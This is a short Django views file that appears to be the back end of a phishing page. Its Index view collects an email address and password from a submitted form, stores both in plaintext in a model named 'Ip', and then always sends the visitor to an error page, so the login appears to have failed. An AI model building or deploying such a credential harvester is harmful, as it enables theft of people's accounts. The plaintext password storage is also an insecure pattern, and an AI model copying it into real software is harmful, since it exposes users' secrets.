from django.shortcuts import render, redirect
from django.http import HttpResponse
from .models import Ip

# Create your views here.
def Index(request):
     if request.method=="POST":
            email=request.POST.get('email','')
            password=request.POST.get('password','')
            ips=Ip(email=email,password=password)
            ips.save()
            return  redirect('error') 
     return render(request,'index.html')
def error(request):
     return render(request,'error.html')
